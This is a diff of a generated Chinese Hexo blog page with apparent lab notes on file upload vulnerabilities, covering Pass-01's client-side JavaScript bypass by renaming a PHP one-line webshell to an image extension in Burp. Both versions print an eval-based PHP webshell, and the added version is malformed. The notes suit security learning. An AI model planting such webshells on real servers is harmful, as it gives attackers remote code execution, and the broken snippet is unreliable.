@@ -1,13 +1,13 @@
-<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Upload—文件上传漏洞 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="# TOP10——upload(文件上传漏洞) # 一、Pass-01-前端js绕过   1.1 方法一：使用bp抓包修改参数：构造的.php（一句话木马）后缀改为.png|.jpg   需要上传php文件，但是有限制不能上传php文件   需要注意的一点时如果想直接抓后缀为.php的包，bp会出现抓不到包的情况   &#x3C;?php @eval($_POST(&#39;pass&#39;)); ?&gt; &amp;#x">
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Upload—文件上传漏洞 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="# TOP10——upload(文件上传漏洞) # 一、Pass-01-前端js绕过   1.1 方法一：使用bp抓包修改参数：构造的.php（一句话木马）后缀改为.png|.jpg   需要上传php文件，但是有限制不能上传php文件   需要注意的一点时如果想直接抓后缀为.php的包，bp会出现抓不到包的情况   &#x3C;?php @eval($_POST[]&#39;pass&#39;]); ?&gt; &amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Upload—文件上传漏洞">
 <meta property="og:url" content="http://example.com/2026/05/24/Upload%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="# TOP10——upload(文件上传漏洞) # 一、Pass-01-前端js绕过   1.1 方法一：使用bp抓包修改参数：构造的.php（一句话木马）后缀改为.png|.jpg   需要上传php文件，但是有限制不能上传php文件   需要注意的一点时如果想直接抓后缀为.php的包，bp会出现抓不到包的情况   &#x3C;?php @eval($_POST(&#39;pass&#39;)); ?&gt; &amp;#x">
+<meta property="og:description" content="# TOP10——upload(文件上传漏洞) # 一、Pass-01-前端js绕过   1.1 方法一：使用bp抓包修改参数：构造的.php（一句话木马）后缀改为.png|.jpg   需要上传php文件，但是有限制不能上传php文件   需要注意的一点时如果想直接抓后缀为.php的包，bp会出现抓不到包的情况   &#x3C;?php @eval($_POST[]&#39;pass&#39;]); ?&gt; &amp;#">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://picsum.photos/200/200">
 <meta property="article:published_time" content="2026-05-24T13:01:15.000Z">
-<meta property="article:modified_time" content="2026-05-24T13:24:10.923Z">
+<meta property="article:modified_time" content="2026-05-24T13:29:52.820Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="Top-10-Upload-文件上传漏洞">
 <meta name="twitter:card" content="summary">
@@ -18,7 +18,7 @@
   "url": "http://example.com/2026/05/24/Upload%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/",
   "image": "https://picsum.photos/200/200",
   "datePublished": "2026-05-24T13:01:15.000Z",
-  "dateModified": "2026-05-24T13:24:10.923Z",
+  "dateModified": "2026-05-24T13:29:52.820Z",
   "author": [
     {
       "@type": "Person",
@@ -216,7 +216,7 @@ body {
     btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
     btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
   }
-})()</script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">Upload—文件上传漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Upload—文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-05-24T13:01:15.000Z" title="Created 2026-05-24 21:01:15">2026-05-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-24T13:24:10.923Z" title="Updated 2026-05-24 21:24:10">2026-05-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="top10upload文件上传漏洞"><a class="anchor" href="#top10upload文件上传漏洞">#</a> TOP10——upload(文件上传漏洞)</h3>
+})()</script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">Upload—文件上传漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Upload—文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-05-24T13:01:15.000Z" title="Created 2026-05-24 21:01:15">2026-05-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-24T13:29:52.820Z" title="Updated 2026-05-24 21:29:52">2026-05-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="top10upload文件上传漏洞"><a class="anchor" href="#top10upload文件上传漏洞">#</a> TOP10——upload(文件上传漏洞)</h3>
 <h3 id="一-pass-01-前端js绕过"><a class="anchor" href="#一-pass-01-前端js绕过">#</a> 一、Pass-01-前端js绕过</h3>
 <ul>
 <li>
@@ -229,11 +229,11 @@ body {
 <p>需要注意的一点时如果想直接抓后缀为.php的包，bp会出现抓不到包的情况</p>
 </li>
 <li>
-<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-php"><span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#A65E2B;--shiki-dark:#C99076">php</span></span>
-<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">@</span><span style="color:#998418;--shiki-dark:#B8A965">eval</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#999999;--shiki-dark:#666666">$</span><span style="color:#B07D48;--shiki-dark:#BD976A">_POST</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#B56959;--shiki-dark:#C98A7D">pass</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">'</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
-<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">?</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span>
-<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">&#x3C;</span><span style="color:#AB5959;--shiki-dark:#CB7676">!--</span><span style="color:#A65E2B;--shiki-dark:#C99076">code￼0</span><span style="color:#AB5959;--shiki-dark:#CB7676">--</span><span style="color:#AB5959;--shiki-dark:#CB7676">></span></span>
-<span class="line"></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>&#x3C;?php</span></span>
+<span class="line"><span>@eval($_POST[]'pass']);</span></span>
+<span class="line"><span>?></span></span>
+<span class="line"><span>&#x3C;!--code￼0--></span></span>
+<span class="line"><span></span></span></code></pre>
 </li>
 </ul>
 </li>
